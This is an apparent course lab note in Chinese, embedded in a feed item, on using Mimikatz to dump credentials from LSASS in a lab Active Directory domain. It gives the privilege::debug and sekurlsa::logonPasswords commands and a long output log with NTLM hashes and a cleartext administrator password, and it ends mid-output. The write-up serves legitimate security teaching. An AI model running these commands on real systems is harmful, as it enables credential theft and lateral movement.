:::&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(透過Mimikatz取得Local Admin的NTLM)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x16%E9%80%8F%E9%81%8Emimikatz%E5%8F%96%E5%BE%97local-admin%E7%9A%84ntlm/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x16%E9%80%8F%E9%81%8Emimikatz%E5%8F%96%E5%BE%97local-admin%E7%9A%84ntlm/</guid><description>&lt;h1 id="ntustisc---ad-note---lab透過mimikatz取得local-admin的ntlm">
 NTUSTISC - AD Note - Lab(透過Mimikatz取得Local Admin的NTLM)
 &lt;a class="anchor" href="#ntustisc---ad-note---lab%e9%80%8f%e9%81%8emimikatz%e5%8f%96%e5%be%97local-admin%e7%9a%84ntlm">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;amp;t=4257">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>得到更高權限之後，會想要更多的密碼&lt;/p>
&lt;ul>
&lt;li>密碼收集
&lt;ul>
&lt;li>SAM.hive(Security Account Manager)&lt;/li>
&lt;li>Password Spraying(用猜的)&lt;/li>
&lt;li>GPO
&lt;ul>
&lt;li>Where: &lt;code>\\&amp;lt;domain&amp;gt;\SysVol\&amp;lt;domain&amp;gt;\Policie&lt;/code>，以本次實驗為例，就是放在&lt;code>\\kuma.org\SYSVOL\kuma.org\Policies&lt;/code>，接下來就是隨機生成的&lt;code>&amp;lt;UID&amp;gt;\Users\Scripts&lt;/code>和&lt;code>&amp;lt;UID&amp;gt;\Machine\Scripts&lt;/code>，這兩個腳本是我們覺得重要的&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>記憶體(lsass)
&lt;ul>
&lt;li>為了獲取更多其他帳號密碼，嘗試逼近Domain Admin，可以使用Mimikatz獲取暫存憑證&lt;/li>
&lt;li>==What is Mimikatz?==
&lt;blockquote>
&lt;p>Mimikatz為一個強力的Windows提權工具，可以提升Process權限、注入Process讀取Process記憶體，可以直接從lsass中獲取當前登錄過系統用戶的帳號明文密碼。
lsass是微軟Windows系統的安全機制它主要用於本地安全和登陸策略，通常我們在登陸系統時輸入密碼之後，密碼便會儲存在lsass內存中，經過其wdigest和tspkg兩個模塊調用後，對其使用可逆的算法進行加密並存儲在內存之中，而mimikatz正是通過對lsass的逆算獲取到明文密碼。
簡單說就是所有登入認證都交給lsass，所以他有所有人的認證憑證&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>Download: &lt;a href="https://github.com/gentilkiwi/mimikatz">Mimikatz-github&lt;/a>&lt;/li>
&lt;li>How to use:
Mimikatz最新版本一共三個文件(mimilib.dll、mimikatz.exe、mimidrv.sys)，分為Win32位(多了一個mimilove.exe文件)和X64位
下載後解壓縮即可使用，裡面分為Win32和X64，Win32是針對Windows32位，而X64是針對64位作業系統，目前絕大部分作業系統為64位&lt;/li>
&lt;li>==lsass.exe VS SAM==
SAM只會存取本地用戶的NTLM Hash，而lsass.exe是只要有存取過目前電腦的使用者都會被記錄，例如domain admin或是其他使用者利用smb連過來也會被lsass紀錄&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="lab">
 Lab
 &lt;a class="anchor" href="#lab">#&lt;/a>
&lt;/h2>
&lt;h3 id="透過mimikatz取得local-admin的ntlm">
 ==透過Mimikatz取得Local Admin的NTLM==
 &lt;a class="anchor" href="#%e9%80%8f%e9%81%8emimikatz%e5%8f%96%e5%be%97local-admin%e7%9a%84ntlm">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>Activate Mimikatz
進入&lt;code>C:\tools\mimikatz_trunk\x64&lt;/code>右鍵以系統管理員身分執行mimikatz.exe(一定要用系統管理員才能執行提權的debug)&lt;/li>
&lt;li>起手式
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>mimikatz &lt;span style="color:#75715e"># Privilege::Debug&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Privilege &lt;span style="color:#e6db74">&amp;#39;20&amp;#39;&lt;/span> OK
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mimikatz &lt;span style="color:#75715e"># log&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Using &lt;span style="color:#e6db74">&amp;#39;mimikatz.log&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> logfile : OK
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mimikatz &lt;span style="color:#75715e"># Sekurlsa::logonPasswords&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::spoiler Log Reuslt
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Using &lt;span style="color:#e6db74">&amp;#39;mimikatz.log&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> logfile : OK
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mimikatz &lt;span style="color:#75715e"># Sekurlsa::logonPasswords&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">23133312&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:0160fc80&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : CachedInteractive from &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : Administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : WIN-818G5VCOLJO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/4 06:07:18
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-21-306106713-2531972042-334329499-500
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 7ecffff0c3548187607a14bad0f88bb1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * DPAPI : cf967ea9c9c0f9d58b79fdd040270648
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : 1qaz@WSX3edc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">20047794&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:0131e7b2&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : CachedInteractive from &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : Administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : WIN-818G5VCOLJO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/4 10:19:22
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-21-306106713-2531972042-334329499-500
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 7ecffff0c3548187607a14bad0f88bb1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * DPAPI : cf967ea9c9c0f9d58b79fdd040270648
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">16441076&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:00fadef4&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : WIN-818G5VCOLJO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/4 12:44:48
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-21-306106713-2531972042-334329499-500
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 7ecffff0c3548187607a14bad0f88bb1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * DPAPI : cf967ea9c9c0f9d58b79fdd040270648
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : administrator
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">14849757&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:00e296dd&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Service from &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : DefaultAppPool
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : IIS APPPOOL
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/3 09:44:12
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma.org
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">1299130&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:0013d2ba&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : bear
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : WIN-818G5VCOLJO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/8/29 12:47:58
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-21-306106713-2531972042-334329499-2101
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : bear
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 7ecffff0c3548187607a14bad0f88bb1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * DPAPI : 4057a0d0b94378dd03224e8b3d28a006
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : bear
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : bear
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">995&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000003e3&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Service from &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : IUSR
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : NT AUTHORITY
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/8/29 12:40:42
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-17
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">997&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000003e5&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Service from &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : LOCAL SERVICE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : NT AUTHORITY
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/8/29 12:40:39
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-19
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">70138&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000111fa&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : DWM-1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : Window Manager
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/8/29 12:40:38
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-90-0-1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma.org
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">70109&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000111dd&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : DWM-1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : Window Manager
